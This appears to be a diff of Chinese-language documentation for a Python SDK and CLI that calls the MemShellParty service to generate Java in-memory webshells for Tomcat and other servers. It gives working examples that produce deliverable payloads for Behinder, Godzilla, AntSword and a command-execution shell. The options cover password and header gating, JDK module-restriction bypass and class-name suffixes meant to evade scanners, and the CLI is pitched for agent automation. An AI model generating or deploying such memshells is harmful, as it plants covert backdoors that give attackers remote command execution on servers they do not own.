@@ -1,89 +1,196 @@
 # wtfutil.memshellutil
 
-MemShellParty HTTP 客户端：查询配置并生成 Java 内存马。默认服务 [https://party.mem.mk](https://party.mem.mk)。CLI 入口为 **`memshell`**（不进入 `__all__`）。
+面向 **Python SDK 调用者** 的说明：通过 HTTP 调用 [MemShellParty](https://github.com/ReaJason/MemShellParty) 服务，查询合法配置并生成 Java 内存马产物。
 
-上游： [MemShellParty](https://github.com/ReaJason/MemShellParty) · [Issue #143](https://github.com/ReaJason/MemShellParty/issues/143)
+- 默认服务：[https://party.mem.mk](https://party.mem.mk)
+- 上游议题：[Issue #143](https://github.com/ReaJason/MemShellParty/issues/143)
+- 命令行另见文末「CLI」；日常脚本/业务代码请用本页的 `MemShellParty`。
 
-**不做内置缓存**；相同配置若需复用结果，请由调用方自行缓存。
+**不做内置缓存。** 相同参数若需复用结果，请在调用方自行缓存（按请求体或业务键）。
+
+---
+
+## 快速上手
 
 ```python
-from wtfutil import MemShellParty
+from wtfutil import MemShellParty, MemShellPartyError
 
 with MemShellParty() as client:
     result = client.generate(
+        shell_tool="Behinder",
         shell_type="Listener",
-        target_jre_version=53,
-        behinder_pass="pass",
-        header_value="secret",
+        target_jre_version=53,   # Java 9+；未指定时自动 byPassJavaModule=True
+        password="pass",         # 通用密码 → behinderPass
+        header_value="secret",   # 请求头门槛（默认 header_name=User-Agent）
     )
-    print(result["packResult"])
-    print(result["memShellResult"]["shellToolConfig"])
+    payload = result["packResult"]           # 打包后的可投递字符串
+    info = result["memShellResult"]          # 类名、尺寸、连接参数等
+    print(payload[:80], "...")
+    print(info["shellClassName"], info["injectorClassName"])
 ```
 
-## 配置
+导入方式任选其一：
 
-优先级：构造参数 `base_url=` > 环境变量 `MEMSHELL_BASE_URL` > `wtfconfig.ini` `[memshell] BASE_URL` > 默认 `https://party.mem.mk`（经 [`configutil`](configutil.md)）。
+```python
+from wtfutil import MemShellParty
+# 或
+from wtfutil.memshellutil import MemShellParty
+```
 
-## MemShellParty
+---
 
-| 方法 | 说明 |
+## 配置服务地址
+
+解析优先级（后者覆盖前者，构造参数最高）：
+
+1. 默认 `https://party.mem.mk`
+2. `wtfconfig.ini` 的 `[memshell] BASE_URL`（经 [`configutil`](configutil.md)）
+3. 环境变量 `MEMSHELL_BASE_URL`
+4. 构造参数 `MemShellParty(base_url="https://...")`
+
+```ini
+# wtfconfig.ini
+[memshell]
+BASE_URL = https://party.mem.mk
+```
+
+```python
+client = MemShellParty(base_url="http://127.0.0.1:8080", timeout=120)
+```
+
+模块级字典 `memshell_config` 会在客户端初始化时按 mtime 热更新；一般业务代码无需直接改它。
+
+---
+
+## 客户端生命周期
+
+| 方式 | 说明 |
 |------|------|
-| `get_config()` | `GET /api/config` → `{ server: { shellTool: [shellType…] } }` |
-| `get_packers_tree()` | `GET /api/config/packers/tree` |
-| `get_command_configs()` | `GET /api/config/command/configs` |
-| `generate(body=None, **)` | `POST /api/memshell/generate`；kwargs 映射官方 camelCase 字段 |
+| `with MemShellParty() as client:` | 推荐；退出时关闭内部 session |
+| `client = MemShellParty(); ...; client.close()` | 手动关闭 |
+| `MemShellParty(session=已有session)` | 复用外部 session；`close()` **不会**关掉外部传入的 session |
 
-默认：`Tomcat` / **Behinder** / `Listener` / JRE `50` / `serverVersion=unknown` / `shrink=True` / `staticInitialize=True` / `packer=DefaultBase64`。`target_jre_version >= 53` 未指定时自动 `byPassJavaModule=True`。Command 时 `encryptor`/`implementationClass` 默认 `RAW`/`RuntimeExec`。
+常用构造参数：
 
-## 参数说明（对齐官方）
+| 参数 | 默认 | 说明 |
+|------|------|------|
+| `base_url` | 见上节 | 服务根地址（无尾斜杠亦可） |
+| `timeout` | `60` | 单次请求超时（秒）；生成可能较慢，可酌情加大 |
+| `session` | 内部新建 | `wtfutil.httputil` 的增强 Session |
 
-| CLI / kwargs | 官方字段 | 含义 |
-|--------------|----------|------|
-| `--server` / `server` | shellConfig.server | 目标中间件/框架（Tomcat、Jetty、SpringWebMvc…） |
-| `--server-version` | shellConfig.serverVersion | 服务版本；少数挂载类型因包名差异才需要 |
-| `--shell-tool` | shellConfig.shellTool | 工具类型：Behinder / Godzilla / Command / AntSword… |
-| `--shell-type` | shellConfig.shellType | 挂载形态：Listener / Filter / Valve / Servlet / Agent… |
-| `--target-jre-version` | shellConfig.targetJreVersion | 目标字节码 class 主版本（50=Java6 … 65=Java21） |
-| `--debug` | shellConfig.debug | 调试：注入器打印注入信息，Shell 打印异常堆栈 |
-| `--by-pass-java-module` | shellConfig.byPassJavaModule | 绕过 JDK9+ 模块限制（Unsafe defineClass） |
-| `--no-shrink` | shellConfig.shrink=false | 默认开启缩小字节码（ASM SKIP_DEBUG） |
-| `--probe` | shellConfig.probe | 回显探测：把注入器放入回显马，便于非本地确认注入 |
-| `--lambda-suffix` | shellConfig.lambdaSuffix | 类名追加 `$Proxy0$$Lambda$1`，便于绕过部分扫描 |
-| `--url-pattern` | injectorConfig.urlPattern | 挂载/匹配 URL（默认 `/*`） |
-| `--injector-class-name` | injectorConfig.injectorClassName | 注入器全限定类名（空则随机） |
-| `--no-static-initialize` | injectorConfig.staticInitialize=false | 默认开：静态块调构造，适配 `Class.forName(...,true,...)` |
-| `--shell-class-name` | shellToolConfig.shellClassName | Shell 全限定类名（空则随机） |
-| `--behinder-pass` | shellToolConfig.behinderPass | 冰蝎密码（空则随机） |
-| `--godzilla-pass` / `--godzilla-key` | godzillaPass / godzillaKey | 哥斯拉密码/密钥（空则随机） |
-| `--ant-sword-pass` | antSwordPass | 蚁剑密码（空则随机） |
-| `--password` / `password` | （按 shellTool 映射） | 通用密码 → Behinder/Godzilla/AntSword 对应 *Pass；专用 `--*-pass` 优先 |
-| `--key` / `key` | godzillaKey | 通用密钥（哥斯拉）；`--godzilla-key` 优先 |
-| `--header-name` / `--header-value` | headerName / headerValue | 入口特征请求头；匹配后才进马逻辑 |
-| `--command-param-name` | commandParamName | Command：命令参数名或头名 |
-| `--command-template` | commandTemplate | Command：模板，`{command}` 占位 |
-| `--encryptor` | encryptor | Command：RAW / BASE64 / DOUBLE_BASE64 |
-| `--implementation-class` | implementationClass | Command：RuntimeExec / ForkAndExec |
-| `--shell-class-base64` | shellClassBase64 | Custom：自定义 `.class` Base64 |
-| `--packer` | packer | 打包格式（DefaultBase64、JSP、SpEL…） |
+---
 
-CLI 也可用 `memshell generate --help` 查看完整说明。
+## API 一览
 
-## CLI：`memshell`
+| 方法 | 作用 |
+|------|------|
+| `get_config()` | 查询「中间件 → 工具 → 挂载类型」合法组合 |
+| `get_packers_tree()` | 查询可用 packer 树（打包格式） |
+| `get_command_configs()` | Command 工具可用的加密器 / 执行实现 |
+| `generate(body=None, **kwargs)` | 生成内存马并打包，返回完整 JSON |
 
-```bash
-memshell generate --help
-memshell generate -o payload.txt
-memshell generate --shell-tool Godzilla --shell-type Filter --target-jre-version 53 -o out.txt
-memshell install-skill --project
+### 先查再生成（推荐）
+
+不确定目标环境支持哪些 `shell_tool` / `shell_type` 时，先拉配置：
+
+```python
+with MemShellParty() as client:
+    cfg = client.get_config()
+    # 形如：{ "Tomcat": { "Behinder": ["Listener", "Filter", ...], ... }, ... }
+    tools = cfg["Tomcat"]
+    print(sorted(tools.keys()))
+    print(tools["Behinder"])
+
+    packers = client.get_packers_tree()  # [{ "name": "...", "children": [...] }, ...]
+    cmd = client.get_command_configs()  # encryptors / implementationClasses
 ```
 
-- **`-o PATH`**：文件仅写 `packResult`；stdout 为 meta JSON。
-- **无 `-o`**：stdout 完整响应 JSON。
+非法组合会在 `generate` 时由服务端报错，SDK 转为 `MemShellPartyError`。
 
-## JRE class version
+---
 
-| Java | targetJreVersion |
-|------|------------------|
+## generate：参数与默认值
+
+`generate(**kwargs)` 使用 **snake_case**，SDK 会组装成官方 camelCase JSON。也可传入完整 `body=` 字典；与 kwargs 同时存在时，**body 深度合并覆盖** kwargs 结果。
+
+### 内置默认（对齐官方常用 UI）
+
+| 维度 | 默认值 |
+|------|--------|
+| 中间件 `server` | `Tomcat` |
+| 工具 `shell_tool` | **`Behinder`（冰蝎）** |
+| 挂载 `shell_type` | `Listener` |
+| 字节码 `target_jre_version` | `50`（Java 6） |
+| `server_version` | `"unknown"`（多数场景不用改） |
+| 缩小字节码 `shrink` | `True` |
+| 静态初始化 `static_initialize` | `True` |
+| 打包 `packer` | `DefaultBase64` |
+| 入口头 `header_name` | `User-Agent` |
+| `by_pass_java_module` | 未指定时：JRE ≥ 53 自动 `True`，否则 `False` |
+
+`shell_tool="Command"` 且未指定时：`encryptor="RAW"`，`implementation_class="RuntimeExec"`。
+
+### 密码与请求头
+
+| 写法 | 行为 |
+|------|------|
+| `password="x"` | 按当前 `shell_tool` 映射到冰蝎 / 哥斯拉 / 蚁剑的 `*Pass` |
+| `key="k"` | 写入哥斯拉 `godzillaKey`（其它工具一般无意义） |
+| `behinder_pass` / `godzilla_pass` / `godzilla_key` / `ant_sword_pass` | **专用字段优先于** 通用 `password` / `key` |
+| 密码类留空 | 服务端随机生成，结果在 `memShellResult.shellToolConfig` 中回传 |
+| `header_name` + `header_value` | 匹配该请求头后才进入马逻辑；`header_value` 常需自行设定 |
+
+```python
+# 通用写法
+client.generate(shell_tool="Behinder", password="p1", header_value="tok")
+
+# 哥斯拉
+client.generate(
+    shell_tool="Godzilla",
+    shell_type="Filter",
+    password="pass",
+    key="key",
+    header_value="tok",
+)
+
+# 专用字段覆盖通用 password
+client.generate(shell_tool="Behinder", password="ignored", behinder_pass="real")
+```
+
+### 参数对照表
+
+| kwargs | 官方字段 | 含义 |
+|--------|----------|------|
+| `server` | shellConfig.server | 目标中间件/框架（Tomcat、Jetty、SpringWebMvc…） |
+| `server_version` | shellConfig.serverVersion | 服务版本；少数挂载因包名差异才需要 |
+| `shell_tool` | shellConfig.shellTool | Behinder / Godzilla / Command / AntSword… |
+| `shell_type` | shellConfig.shellType | Listener / Filter / Valve / Servlet / Agent… |
+| `target_jre_version` | shellConfig.targetJreVersion | class 主版本，见下表 |
+| `debug` | shellConfig.debug | 注入器打印注入信息，Shell 打印异常堆栈 |
+| `by_pass_java_module` | shellConfig.byPassJavaModule | 绕过 JDK9+ 模块限制（Unsafe defineClass） |
+| `shrink` | shellConfig.shrink | 缩小字节码（ASM SKIP_DEBUG）；默认 True |
+| `probe` | shellConfig.probe | 回显探测：把注入器放入回显马，便于非本地确认 |
+| `lambda_suffix` | shellConfig.lambdaSuffix | 类名追加 `$Proxy0$$Lambda$1`，利于绕过部分扫描 |
+| `url_pattern` | injectorConfig.urlPattern | 挂载/匹配 URL，默认 `/*` |
+| `injector_class_name` | injectorConfig.injectorClassName | 注入器全限定类名；空则随机 |
+| `static_initialize` | injectorConfig.staticInitialize | 静态块调构造，适配 `Class.forName(..., true, ...)` |
+| `shell_class_name` | shellToolConfig.shellClassName | Shell 全限定类名；空则随机 |
+| `behinder_pass` | behinderPass | 冰蝎密码 |
+| `godzilla_pass` / `godzilla_key` | godzillaPass / godzillaKey | 哥斯拉密码/密钥 |
+| `ant_sword_pass` | antSwordPass | 蚁剑密码 |
+| `password` / `key` | （按工具映射） | 通用凭证，见上节 |
+| `header_name` / `header_value` | headerName / headerValue | 入口特征请求头 |
+| `command_param_name` | commandParamName | Command：命令参数名或头名 |
+| `command_template` | commandTemplate | Command：模板，`{command}` 占位 |
+| `encryptor` | encryptor | Command：RAW / BASE64 / DOUBLE_BASE64 |
+| `implementation_class` | implementationClass | Command：RuntimeExec / ForkAndExec |
+| `shell_class_base64` | shellClassBase64 | Custom：自定义 `.class` 的 Base64 |
+| `packer` | packer | 打包格式（DefaultBase64、JSP、SpEL…） |
+
+### JRE class 版本
+
+| Java | `target_jre_version` |
+|------|----------------------|
 | 6 | 50 |
 | 8 | 52 |
 | 9 | 53 |
@@ -91,11 +198,162 @@ memshell install-skill --project
 | 17 | 61 |
 | 21 | 65 |
 
-## 辅助
+目标运行时是 JDK 9+ 时，建议至少 `53`，以便自动打开模块绕过。
 
-- `build_generate_body(...)` — 组装官方请求体（支持通用 `password` / `key`）
-- `resolve_shell_credentials(...)` — 按 shellTool 映射通用密码
-- `extract_generate_meta(result, output=...)` — CLI meta
-- `MemShellPartyError` — API 错误
+---
 
-测试：`tests/test_memshell.py`（`python -m unittest tests.test_memshell`；`MEMSHELL_SKIP_LIVE=1` 可跳过联调）。
+## 返回值怎么用
+
+`generate` 成功时返回 **dict**（完整服务端 JSON），常用字段：
+
+| 键 | 用途 |
+|----|------|
+| `packResult` | 按 `packer` 打包后的主产物（字符串）；业务侧通常只关心这个 |
+| `allPackResults` | 部分场景下的多格式产物（若有） |
+| `memShellResult` | 元信息：类名、大小、最终 shellConfig / shellToolConfig / injectorConfig |
+
+```python
+result = client.generate(...)
+payload = result["packResult"]
+
+mem = result["memShellResult"]
+print(mem["shellClassName"], mem["injectorClassName"])
+print(mem["shellSize"], mem["injectorSize"])
+print(mem["shellToolConfig"])  # 含实际密码等（若曾留空随机）
+```
+
+若只要紧凑元信息、不要大段 `packResult`，可用：
+
+```python
+from wtfutil import extract_generate_meta
+
+meta = extract_generate_meta(result)
+# shellClassName / injectorClassName / shellToolConfig / hasPackResult ...
+```
+
+---
+
+## 更多示例
+
+### 冰蝎 + Filter + 指定 packer
+
+```python
+with MemShellParty() as client:
+    r = client.generate(
+        server="Tomcat",
+        shell_tool="Behinder",
+        shell_type="Filter",
+        target_jre_version=52,
+        url_pattern="/*",
+        password="admin",
+        header_name="User-Agent",
+        header_value="Mozilla/5.0-mem",
+        packer="DefaultBase64",
+    )
+    open("payload.txt", "w", encoding="utf-8").write(r["packResult"])
+```
+
+### Command 工具
+
+```python
+with MemShellParty() as client:
+    opts = client.get_command_configs()
+    r = client.generate(
+        shell_tool="Command",
+        shell_type="Listener",
+        target_jre_version=53,
+        command_param_name="cmd",
+        encryptor="RAW",
+        implementation_class="RuntimeExec",
+        header_value="x",
+    )
+```
+
+### 直接传官方 camelCase body
+
+```python
+body = {
+    "shellConfig": {"server": "Tomcat", "shellTool": "Behinder", "shellType": "Listener"},
+    "shellToolConfig": {"behinderPass": "p", "headerValue": "h"},
+    "injectorConfig": {"urlPattern": "/*"},
+    "packer": "DefaultBase64",
+}
+# 仍会先按 kwargs 默认组装，再用 body 深度覆盖
+result = client.generate(body=body, target_jre_version=53)
+```
+
+也可只组装请求体、稍后再发：
+
+```python
+from wtfutil import build_generate_body
+
+req = build_generate_body(shell_tool="Godzilla", password="p", key="k", header_value="h")
+result = client.generate(body=req)
+```
+
+---
+
+## 错误处理
+
+失败时抛出 `MemShellPartyError`：
+
+| 属性 | 含义 |
+|------|------|
+| `str(e)` / `args` | 错误信息（优先服务端 `error` 字段） |
+| `e.status_code` | HTTP 状态码（可能为 `None`） |
+| `e.body` | 原始响应 body（dict 或文本片段） |
+
+```python
+from wtfutil import MemShellParty, MemShellPartyError
+
+try:
+    with MemShellParty() as client:
+        client.generate(shell_type="NotExist")
+except MemShellPartyError as e:
+    print(e, e.status_code, e.body)
+```
+
+常见原因：组合不合法、服务不可达、响应非 JSON、超时。网络层异常也可能以底层 `requests` 异常直接抛出，按需外层再包一层。
+
+---
+
+## 辅助符号
+
+| 符号 | 说明 |
+|------|------|
+| `DEFAULT_BASE_URL` | 默认服务根地址常量 |
+| `memshell_config` | 运行时配置 dict（`BASE_URL`） |
+| `build_generate_body(...)` | 只组装请求体，不发 HTTP |
+| `resolve_shell_credentials(...)` | 将 `password`/`key` 映射到专用凭证字段 |
+| `extract_generate_meta(result, output=...)` | 从响应提取紧凑 meta |
+| `MemShellPartyError` | API / 协议错误 |
+
+---
+
+## CLI（可选）
+
+安装包后提供控制台命令 `memshell`（不在包 `__all__` 中）。人类/脚本优先用 SDK；自动化或 Agent 场景可用 CLI。
+
+```bash
+memshell generate --help
+memshell generate -o payload.txt
+memshell generate --shell-tool Godzilla --shell-type Filter --target-jre-version 53 -o out.txt
+memshell config
+memshell packers
+memshell install-skill --project
+```
+
+- **`-o PATH`**：文件只写 `packResult`；stdout 为 meta JSON。
+- **无 `-o`**：stdout 完整响应 JSON。
+
+参数与上表 kwargs 一一对应，详见 `memshell generate --help`。
+
+---
+
+## 测试
+
+```bash
+python -m unittest tests.test_memshell
+# 跳过访问 party.mem.mk 的联调用例：
+set MEMSHELL_SKIP_LIVE=1
+```
